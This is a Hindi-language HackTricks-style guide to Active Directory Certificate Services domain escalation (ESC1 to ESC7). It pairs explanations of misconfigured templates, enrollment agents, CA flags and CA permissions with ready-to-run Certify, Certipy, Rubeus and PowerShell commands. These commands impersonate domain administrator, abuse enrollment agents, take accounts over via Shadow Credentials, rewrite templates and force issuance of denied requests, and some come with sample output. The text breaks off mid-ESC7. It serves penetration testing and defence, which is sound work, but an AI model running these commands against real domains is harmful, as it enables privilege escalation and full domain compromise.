# AD CS डोमेन एस्केलेशन

{{#include ../../../banners/hacktricks-training.md}}


**यह पोस्ट के एस्केलेशन तकनीक वाले अनुभागों का सारांश है:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## गलत कॉन्फ़िगर किए गए Certificate Templates - ESC1

### स्पष्टीकरण

### गलत कॉन्फ़िगर किए गए Certificate Templates - ESC1 की व्याख्या

- **Enterprise CA द्वारा कम-विशेषाधिकार वाले उपयोगकर्ताओं को Enrolment अधिकार दिए जाते हैं।**
- **Manager की मंज़ूरी आवश्यक नहीं है।**
- **अधिकृत कर्मियों के हस्ताक्षर आवश्यक नहीं हैं।**
- **Certificate templates पर Security descriptors अत्यधिक अनुमतिपूर्ण होते हैं, जिससे कम-विशेषाधिकार वाले उपयोगकर्ताओं को Enrolment अधिकार मिल सकते हैं।**
- **Certificate templates को authentication में मदद करने वाले EKUs परिभाषित करने के लिए कॉन्फ़िगर किया जाता है:**
  - Extended Key Usage (EKU) identifiers जैसे Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), या कोई EKU नहीं (SubCA) शामिल होते हैं।
- **Template, Certificate Signing Request (CSR) में subjectAltName शामिल करने की अनुमति requesters को देता है:**
  - यदि certificate में subjectAltName (SAN) मौजूद हो, तो Active Directory (AD) identity verification के लिए उसे प्राथमिकता देता है। इसका अर्थ है कि CSR में SAN निर्दिष्ट करके किसी भी उपयोगकर्ता (जैसे, डोमेन administrator) का रूप धारण करने के लिए certificate माँगा जा सकता है। Requester SAN निर्दिष्ट कर सकता है या नहीं, यह certificate template के AD object में `mspki-certificate-name-flag` property से पता चलता है। यह property एक bitmask है, और `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag मौजूद होने पर requester SAN निर्दिष्ट कर सकता है।

> [!CAUTION]
> ये settings ESC1 template के संभावित उम्मीदवार की पहचान करती हैं, न कि impersonation का पूरा रास्ता। जाँचें कि target principal उस CA पर enroll कर सकता है जो template प्रकाशित करता है, CA enrollment की अनुमति देता है, और जारी किया गया certificate authentication endpoint के strong SID mapping नियमों को पूरा करता है। वर्तमान patched KDCs अनुरोधित UPN को अस्वीकार कर सकते हैं, यदि certificate का SID target से मेल नहीं खाता; इसके लिए [Microsoft की certificate mapping guidance](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) देखें।

**Domain Computers** को दिए गए enrollment अधिकार किसी staged computer identity को पात्र बना सकते हैं, भले ही मूल user enroll न कर सके। Computer principal के अधिकारों का अलग से आकलन करें। Request करने से पहले `msPKI-Minimal-Key-Size` जाँचें: 4096-bit RSA keys की आवश्यकता वाला template, client की 2048-bit default key को अस्वीकार कर देगा। अनुरोध में दिया गया target SID, SID mismatch को तभी दूर कर सकता है जब CA और KDC से बना हुआ certificate तथा उसकी mapping स्वीकार्य हों; केवल template flags या Enroll ACE से यह साबित नहीं होता।

यह सुविधा कभी-कभी products या deployment services द्वारा HTTPS या host certificates तुरंत बनाने की सुविधा देने के लिए सक्षम की जाती है, या समझ की कमी के कारण।

ध्यान दें कि इस विकल्प के साथ certificate बनाने पर warning दिखाई देती है। लेकिन किसी मौजूदा certificate template (जैसे `WebServer` template, जिसमें `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` सक्षम है) की duplicate copy बनाकर उसमें authentication OID जोड़ने पर ऐसा नहीं होता।<sup>[[6]](#references)</sup>

### दुरुपयोग

**कमज़ोर certificate templates ढूँढने** के लिए यह चला सकते हैं:

```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```

इस vulnerability का दुरुपयोग करके administrator का रूप धारण करने के लिए, यह चलाया जा सकता है:

```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
  /url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
  -template 'ESC1' -upn 'administrator@corp.local'
```

इसके बाद आप जनरेट किए गए **certificate को `.pfx`** फ़ॉर्मैट में बदल सकते हैं और फिर से **Rubeus या certipy का उपयोग करके authenticate** कर सकते हैं:<sup>[[5]](#references)</sup>

```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```

Windows binaries "Certreq.exe" और "Certutil.exe" का उपयोग PFX जनरेट करने के लिए किया जा सकता है: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD Forest के configuration schema में certificate templates की enumeration—विशेष रूप से उन templates की जिन्हें approval या signatures की आवश्यकता नहीं होती, जिनमें Client Authentication या Smart Card Logon EKU होता है, और जिनमें `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag enabled होता है—निम्न LDAP query चलाकर की जा सकती है:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```

## गलत तरीके से कॉन्फ़िगर किए गए Certificate Templates - ESC2

### विवरण

दूसरा दुरुपयोग परिदृश्य पहले का एक रूपांतर है:

1. Enterprise CA द्वारा कम विशेषाधिकार वाले उपयोगकर्ताओं को enrollment अधिकार दिए जाते हैं।
2. Manager approval की आवश्यकता अक्षम होती है।
3. Authorized signatures की आवश्यकता हटा दी जाती है।
4. Certificate template पर अत्यधिक अनुमति देने वाला security descriptor कम विशेषाधिकार वाले उपयोगकर्ताओं को certificate enrollment अधिकार देता है।
5. **Certificate template में Any Purpose EKU या कोई EKU शामिल नहीं होता है।**

**Any Purpose EKU** किसी attacker को **किसी भी उद्देश्य** के लिए certificate प्राप्त करने की अनुमति देता है, जिसमें client authentication, server authentication, code signing आदि शामिल हैं। इस परिदृश्य का शोषण करने के लिए **ESC3 में इस्तेमाल की गई वही technique** अपनाई जा सकती है।

**कोई EKU न रखने वाले certificates**, जो subordinate CA certificates की तरह काम करते हैं, **किसी भी उद्देश्य** के लिए इस्तेमाल किए जा सकते हैं और **नए certificates पर हस्ताक्षर करने के लिए भी उपयोग किए जा सकते हैं**। इसलिए, attacker subordinate CA certificate का उपयोग करके नए certificates में मनमाने EKU या fields निर्दिष्ट कर सकता है।

हालाँकि, **domain authentication** के लिए बनाए गए नए certificates काम नहीं करेंगे, यदि subordinate CA पर **`NTAuthCertificates`** object द्वारा भरोसा नहीं किया जाता है—और यही default setting है। फिर भी, attacker **किसी भी EKU** और मनमाने certificate values वाले **नए certificates बना सकता है**। इनका कई उद्देश्यों (जैसे code signing, server authentication आदि) के लिए **दुरुपयोग** किया जा सकता है और नेटवर्क के अन्य applications, जैसे SAML, AD FS या IPSec पर इनके गंभीर प्रभाव हो सकते हैं।<sup>[[6]](#references)</sup>

AD Forest के configuration schema में इस परिदृश्य से मेल खाने वाले templates की गणना करने के लिए, यह LDAP query चलाई जा सकती है:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```

## गलत तरीके से कॉन्फ़िगर किए गए Enrolment Agent Templates - ESC3

### व्याख्या

यह scenario पहले और दूसरे scenario जैसा है, लेकिन इसमें **अलग EKU का दुरुपयोग** (Certificate Request Agent) और **2 अलग templates** इस्तेमाल किए जाते हैं (इसलिए इसकी आवश्यकताओं के 2 सेट हैं),

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), जिसे Microsoft दस्तावेज़ों में **Enrollment Agent** कहा जाता है, किसी principal को **किसी अन्य user की ओर से certificate के लिए enroll** करने की अनुमति देता है।

**“Enrollment agent”** ऐसे **template** में enroll करता है और प्राप्त **certificate का उपयोग किसी अन्य user की ओर से CSR को co-sign करने के लिए करता है**। फिर वह **co-signed CSR** को CA को **भेजता है**, ऐसे **template** में enroll करता है जो **“enroll on behalf of”** की अनुमति देता है, और CA **“दूसरे” user का certificate** जारी करके जवाब देता है।<sup>[[6]](#references)</sup>

**आवश्यकताएँ 1:**

- Enterprise CA द्वारा कम privileges वाले users को enrollment rights दिए गए हों।
- Manager approval की आवश्यकता न हो।
- Authorized signatures की आवश्यकता न हो।
- Certificate template का security descriptor अत्यधिक permissive हो और कम privileges वाले users को enrollment rights देता हो।
- Certificate template में Certificate Request Agent EKU शामिल हो, जिससे अन्य principals की ओर से दूसरे certificate templates के लिए request की जा सके।

**आवश्यकताएँ 2:**

- Enterprise CA कम privileges वाले users को enrollment rights देता हो।
- Manager approval को bypass किया गया हो।
- Version 1 का target template, नए granular issuance-policy controls के बिना enrollment agent को स्वीकार कर सकता है; version 2 या नए versions के लिए, केवल version के आधार पर template को बाहर करने के बजाय उसकी application-policy issuance requirements और authorized signatures की जाँच करें।
- Certificate template में परिभाषित EKU domain authentication की अनुमति देता हो।
- CA पर enrollment agents के लिए restrictions लागू न हों।

Target template को चुने गए CA द्वारा प्रकाशित भी होना चाहिए, target account को enroll करने की अनुमति देनी चाहिए, और इच्छित domain-authentication उपयोग को support करना चाहिए। उस account पर आवश्यक subject/SAN attributes की जाँच करें; उदाहरण के लिए, AD से subject email बनाने वाला template ऐसे account के लिए certificate जारी नहीं कर सकता जिसमें आवश्यक `mail` value न हो। केवल agent certificate होने से target-template की ये शर्तें पूरी नहीं होतीं।

### दुरुपयोग

इस scenario का दुरुपयोग करने के लिए आप [**Certify**](https://github.com/GhostPack/Certify) या [**Certipy**](https://github.com/ly4k/Certipy) का उपयोग कर सकते हैं:<sup>[[4]](#references)</sup>

```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```

**उपयोगकर्ता** जिन्हें **enrollment agent certificate प्राप्त करने** की अनुमति है, वे templates जिनमें **enrollment agents** को enroll करने की अनुमति है, और वे **accounts** जिनकी ओर से enrollment agent कार्य कर सकता है—इन पर enterprise CAs द्वारा पाबंदी लगाई जा सकती है। इसके लिए `certsrc.msc` **snap-in** खोलें, **CA पर right-click करें**, **Properties पर click करें**, फिर “Enrollment Agents” tab पर **जाएँ**।

हालाँकि, यह ध्यान देने योग्य है कि CAs की **default** setting “**Do not restrict enrollment agents**” है। जब administrators enrollment agents पर पाबंदी लगाते हैं और setting को “Restrict enrollment agents” पर रखते हैं, तब भी default configuration बेहद permissive रहती है। इससे **Everyone** को किसी के भी रूप में सभी templates में enroll करने की अनुमति मिलती है।

### Certi-Bhai के साथ केवल Windows PowerShell PoCs

[**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai) Certify या Certipy के बिना ESC1 और ESC2/ESC3 को आज़माता है। इसकी scripts `X509Enrollment` COM API से exportable 2048-bit RSA key बनाती हैं, PKCS#10 request तैयार करती हैं, LDAP के ज़रिए पहला `pKIEnrollmentService` खोजती हैं, `CertificateAuthority.Request` के माध्यम से उसे submit करती हैं, response को `Cert:\CurrentUser\My` में install करती हैं और Base64-encoded PFX export करती हैं। ESC1 script attacker द्वारा चुना गया UPN SAN (`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`, value `0xb`) जोड़ती है, जबकि ESC2/ESC3 scripts पहली certificate का उपयोग on-behalf-of request पर हस्ताक्षर करने के लिए करती हैं।<sup>[[27]](#references)</sup>

```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
  -altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
  -target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```

स्क्रिप्ट **PFX** का Base64 प्रिंट करती हैं, जिसमें private key शामिल होती है, ताकि इसे Rubeus के साथ सीधे इस्तेमाल किया जा सके। इसे `[Convert]::ToBase64String($cert.RawData)` से न बदलें: `RawData` केवल public certificate को encode करता है और PKINIT request पर हस्ताक्षर नहीं कर सकता।<sup>[[5]](#references)[[27]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```

## कमजोर Certificate Template Access Control - ESC4

### **व्याख्या**

**Certificate templates** पर **security descriptor** उन **permissions** को परिभाषित करता है जो विशिष्ट **AD principals** के पास उस template के संबंध में होती हैं।

यदि किसी **attacker** के पास किसी **template** को **बदलने** और **पिछले sections** में बताई गई कोई भी **exploitable misconfigurations** लागू करने के लिए आवश्यक **permissions** हों, तो privilege escalation संभव हो सकता है।

Certificate templates पर लागू होने वाली उल्लेखनीय permissions में शामिल हैं:<sup>[[6]](#references)</sup>

- **Owner:** Object पर निहित नियंत्रण देता है, जिससे किसी भी attributes को संशोधित किया जा सकता है।
- **FullControl:** Object पर पूर्ण अधिकार देता है, जिसमें किसी भी attributes को बदलने की क्षमता शामिल है।
- **WriteOwner:** Object के owner को attacker के नियंत्रण वाले principal में बदलने की अनुमति देता है।
- **WriteDacl:** Access controls में बदलाव की अनुमति देता है, जिससे attacker को FullControl मिल सकता है।
- **WriteProperty:** Object की किसी भी properties को संपादित करने की अनुमति देता है।

`CN=Certificate Templates,CN=Public Key Services,CN=Services,...` container पर DACL की भी समीक्षा करें। [`pKICertificateTemplate` class](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adsc/db4b45f7-e57a-4ae1-9b8f-1b107b69d98c) पर लागू `CreateChild` ACE, या व्यापक full control, नया template object बनाने का संभावित माध्यम है। [Microsoft के दस्तावेज़](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/9279abb2-3dfa-4631-845c-43c187ac4b44) के अनुसार, इस container में ये template objects होते हैं। यह तय करने से पहले कि creation प्रभावी होगा या नहीं, matching deny ACEs और inheritance की समीक्षा करें। केवल template बनाने से certificate जारी नहीं होता: CA को उसे publish करना होगा, requesting principal के पास enrollment access होना चाहिए, और authentication endpoint पर certificate को इच्छित identity से map होना चाहिए।

### दुरुपयोग

Templates और अन्य PKI objects पर edit rights वाले principals की पहचान करने के लिए Certify से enumerate करें:

```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```

पहले वाले की तरह privesc का एक उदाहरण:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 तब होता है जब किसी user के पास certificate template पर write privileges होते हैं। उदाहरण के लिए, इसका दुरुपयोग certificate template का configuration overwrite करके उसे ESC1 के लिए vulnerable बनाने में किया जा सकता है।

ऐसा template जो enrollee को subject देने देता है, लेकिन जिसमें केवल Server Authentication usage है, अपने-आप में user-logon template नहीं होता। Template पर प्रभावी control rights होने पर, attacker certificate request करने से पहले उसके authentication EKUs या application policies बदल सकता है; [Microsoft, Smartcard Logon EKU के sign-in purpose को दस्तावेज़ करता है](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts)। पुष्टि करें कि CA modified template को publish करता है, requester enroll कर सकता है, approval/signature की आवश्यकताएँ पूरी हैं, और जारी किया गया certificate इच्छित account से map होता है। विशेष रूप से, [Full Enforcement में patched domain controllers](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) strong mapping के बिना certificates को reject करते हैं; request में target UPN जोड़ने से यह आवश्यकता bypass नहीं होती।

जैसा कि हम ऊपर के path में देख सकते हैं, केवल `JOHNPC` के पास ये privileges हैं, लेकिन हमारे user `JOHN` के पास `JOHNPC` के लिए नया `AddKeyCredentialLink` edge है। चूँकि यह technique certificates से संबंधित है, इसलिए मैंने इस attack को भी implement किया है। इसे [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) के नाम से जाना जाता है।<sup>[[8]](#references)</sup> Victim का NT hash प्राप्त करने के लिए Certipy के `shadow auto` command की एक छोटी-सी झलक यहाँ है।

```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```

**Certipy** एक ही command से certificate template की configuration को overwrite कर सकता है। **Default** रूप से, Certipy configuration को **overwrite** करके उसे **ESC1 के प्रति vulnerable** बना देगा। हम पुरानी configuration को **save** करने के लिए **`-save-old` parameter** भी specify कर सकते हैं, जो हमारे attack के बाद configuration को **restore** करने में उपयोगी होगा।

```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```

## असुरक्षित PKI ऑब्जेक्ट एक्सेस कंट्रोल - ESC5

### व्याख्या

आपस में जुड़े ACL-आधारित संबंधों का व्यापक जाल, जिसमें certificate templates और certificate authority से परे कई ऑब्जेक्ट शामिल हैं, पूरे AD CS सिस्टम की सुरक्षा को प्रभावित कर सकता है। सुरक्षा पर महत्वपूर्ण प्रभाव डालने वाले इन ऑब्जेक्ट में शामिल हैं:

- CA server का AD computer object, जिसे S4U2Self या S4U2Proxy जैसे तरीकों से compromise किया जा सकता है।
- CA server का RPC/DCOM server।
- विशिष्ट container path `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` के भीतर मौजूद कोई भी descendant AD object या container। इस path में Certificate Templates container, Certification Authorities container, NTAuthCertificates object और Enrollment Services Container जैसे containers और objects शामिल हैं, लेकिन यह इन्हीं तक सीमित नहीं है।

यदि कोई कम-विशेषाधिकार वाला attacker इन महत्वपूर्ण घटकों में से किसी पर भी नियंत्रण हासिल कर लेता है, तो PKI सिस्टम की सुरक्षा से समझौता हो सकता है।<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### व्याख्या

[**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) में चर्चा किया गया विषय Microsoft द्वारा बताए गए **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag के निहितार्थों को भी छूता है। Certification Authority (CA) पर सक्रिय होने पर, यह configuration **किसी भी request** के **subject alternative name** में **user-defined values** शामिल करने की अनुमति देता है—उन requests में भी जो Active Directory® से बनाई गई हों। परिणामस्वरूप, इससे कोई **intruder** domain **authentication** के लिए configured **किसी भी template** के ज़रिए enrollment कर सकता है—विशेषकर उन templates के ज़रिए जो मानक User template की तरह **unprivileged** users को enrollment की अनुमति देते हैं। इससे intruder एक certificate हासिल कर सकता है और domain administrator या domain के **किसी भी अन्य सक्रिय entity** के रूप में authenticate कर सकता है।<sup>[[9]](#references)</sup>

**नोट**: `certreq.exe` में `-attrib "SAN:"` argument के ज़रिए Certificate Signing Request (CSR) में **alternative names** जोड़ने का तरीका (जिसे “Name Value Pairs” कहा जाता है), ESC1 में SANs के exploitation की रणनीति से **अलग** है। यहाँ अंतर यह है कि **account information कैसे समाहित की जाती है**—certificate extension के बजाय certificate attribute में।

### दुरुपयोग

यह जाँचने के लिए कि setting सक्रिय है या नहीं, संगठन `certutil.exe` के साथ निम्न command का उपयोग कर सकते हैं:

```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```

यह ऑपरेशन मूलतः **remote registry access** का उपयोग करता है, इसलिए एक वैकल्पिक तरीका हो सकता है:

```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```

[**Certify**](https://github.com/GhostPack/Certify) और [**Certipy**](https://github.com/ly4k/Certipy) जैसे टूल इस misconfiguration का पता लगाने और उसका exploit करने में सक्षम हैं:<sup>[[4]](#references)</sup>

```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```

इन settings को बदलने के लिए, यदि आपके पास **domain administrative** अधिकार या समकक्ष अधिकार हैं, तो निम्न command किसी भी workstation से चलाई जा सकती है:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

अपने environment में इस configuration को disable करने के लिए, flag को इस कमांड से हटाया जा सकता है:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

> [!WARNING]
> मई 2022 के security updates के बाद जारी किए गए नए **certificates** में एक **security extension** होगा, जिसमें **requester की `objectSid` property** शामिल होती है। ESC1 के लिए, यह SID निर्दिष्ट SAN से निकाली जाती है। हालांकि, **ESC6** के लिए, SID SAN के बजाय **requester की `objectSid`** को दर्शाती है।\
> ESC6 का exploit करने के लिए, सिस्टम का ESC10 (Weak Certificate Mappings) के प्रति susceptible होना आवश्यक है, जो **नई security extension के बजाय SAN को प्राथमिकता देता है**।

## Vulnerable Certificate Authority का Access Control - ESC7

### Attack 1

#### विवरण

Certificate authority का access control, CA की कार्रवाइयों को नियंत्रित करने वाली permissions के एक सेट के ज़रिए बनाए रखा जाता है। इन permissions को `certsrv.msc` खोलकर, किसी CA पर right-click करके, properties चुनकर और फिर Security टैब पर जाकर देखा जा सकता है। इसके अलावा, PSPKI module का उपयोग करके इन permissions की enumeration इस तरह के commands से की जा सकती है:

```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```

यह प्राथमिक अधिकारों, अर्थात् **`ManageCA`** और **`ManageCertificates`**, के बारे में जानकारी देता है, जो क्रमशः “CA administrator” और “Certificate Manager” की भूमिकाओं से संबंधित हैं।<sup>[[6]](#references)</sup>

#### दुरुपयोग

किसी certificate authority पर **`ManageCA`** अधिकार होने से principal, PSPKI का उपयोग करके दूरस्थ रूप से सेटिंग्स में बदलाव कर सकता है। इसमें **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag को टॉगल करना शामिल है, जिससे किसी भी template में SAN निर्दिष्ट किया जा सकता है—यह domain escalation का एक महत्वपूर्ण पहलू है।

PSPKI के **Enable-PolicyModuleFlag** cmdlet का उपयोग करके इस प्रक्रिया को सरल बनाया जा सकता है, जिससे सीधे GUI के साथ इंटरैक्ट किए बिना बदलाव किए जा सकते हैं।

**`ManageCertificates`** अधिकार होने से pending requests को approve करना संभव होता है, जिससे “CA certificate manager approval” सुरक्षा उपाय को प्रभावी रूप से दरकिनार किया जा सकता है।

Certificate का अनुरोध करने, उसे approve करने और डाउनलोड करने के लिए **Certify** तथा **PSPKI** modules को एक साथ उपयोग किया जा सकता है:

```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```

### Attack 2

#### व्याख्या

> [!WARNING]
> **पिछले हमले** में **EDITF_ATTRIBUTESUBJECTALTNAME2** फ़्लैग को **सक्षम** करने के लिए **`Manage CA`** अनुमतियों का उपयोग करके **ESC6 हमला** किया गया था, लेकिन CA सेवा (`CertSvc`) को रीस्टार्ट किए जाने तक इसका कोई प्रभाव नहीं होगा। जब किसी उपयोगकर्ता के पास `Manage CA` एक्सेस अधिकार होता है, तो उसे **सेवा रीस्टार्ट करने** की भी अनुमति होती है। हालाँकि, **इसका अर्थ यह नहीं है कि उपयोगकर्ता सेवा को दूरस्थ रूप से रीस्टार्ट कर सकता है**। इसके अलावा, मई 2022 के सुरक्षा अपडेट के कारण, अधिकांश पैच किए गए परिवेशों में **E**SC6 शायद **बिना किसी अतिरिक्त बदलाव के काम न करे**।

इसलिए, यहाँ एक अन्य हमले का तरीका प्रस्तुत किया गया है।

पूर्वापेक्षाएँ:

- केवल **`ManageCA` अनुमति**
- **`Manage Certificates`** अनुमति (**`ManageCA`** से दी जा सकती है)
- **`SubCA`** सर्टिफ़िकेट टेम्पलेट **सक्षम** होना चाहिए (**`ManageCA`** से सक्षम किया जा सकता है)

यह तकनीक इस तथ्य पर निर्भर करती है कि `Manage CA` _और_ `Manage Certificates` एक्सेस अधिकार वाले उपयोगकर्ता **अस्वीकृत सर्टिफ़िकेट अनुरोध जारी कर सकते हैं**। **`SubCA`** सर्टिफ़िकेट टेम्पलेट **ESC1 के प्रति असुरक्षित** है, लेकिन टेम्पलेट में केवल **व्यवस्थापक** ही नामांकन कर सकते हैं। इसलिए, कोई **उपयोगकर्ता** **`SubCA`** में नामांकन का **अनुरोध** कर सकता है—जिसे **अस्वीकार कर दिया जाएगा**—लेकिन **बाद में मैनेजर द्वारा जारी कर दिया जाएगा**।<sup>[[6]](#references)</sup>

#### दुरुपयोग

आप अपने उपयोगकर्ता को नया अधिकारी बनाकर उसे **`Manage Certificates`** एक्सेस अधिकार दे सकते हैं।

```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```

**`SubCA`** टेम्पलेट को `-enable-template` पैरामीटर के साथ **CA पर सक्षम** किया जा सकता है। डिफ़ॉल्ट रूप से, `SubCA` टेम्पलेट सक्षम होता है।

```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```

यदि हमने इस हमले की पूर्वापेक्षाएँ पूरी कर ली हैं, तो हम **`SubCA` template पर आधारित certificate का अनुरोध करके** शुरुआत कर सकते हैं।

**यह अनुरोध अस्वीकार कर दिया जाए**गा, लेकिन हम private key सहेज लेंगे और request ID नोट कर लेंगे।

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```

हमारे **`Manage CA` और `Manage Certificates`** के साथ, हम `ca` command और `-issue-request <request ID>` parameter का उपयोग करके **विफल certificate अनुरोध जारी** कर सकते हैं।

```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

और अंत में, हम `req` कमांड और `-retrieve <request ID>` पैरामीटर का उपयोग करके **जारी किया गया सर्टिफिकेट प्राप्त** कर सकते हैं।

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

